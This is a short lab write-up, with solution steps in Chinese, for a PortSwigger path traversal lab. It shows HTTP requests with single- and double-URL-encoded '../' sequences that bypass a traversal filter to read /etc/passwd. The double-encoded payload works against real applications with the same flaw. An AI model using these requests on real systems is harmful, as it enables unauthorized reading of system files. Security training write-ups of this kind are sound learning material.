# File path traversal, traversal sequences stripped with superfluous URL-decode

## Information
---

- [PortSwigger - Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 

## Solution
---

- [URL Decode and Encode](https://www.urlencoder.org/)
- [W2school - HTML URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.ASP0)

1. 嘗試將 **filename** 更改為 URL 編碼後的值。
    ```
    GET /image?filename=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
    ...
    ```
    - 嘗試過後發現不行，則嘗試在對其進行一次編碼。

2. 嘗試再次編碼。
    ```
    GET /image?filename=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
    ...
    ```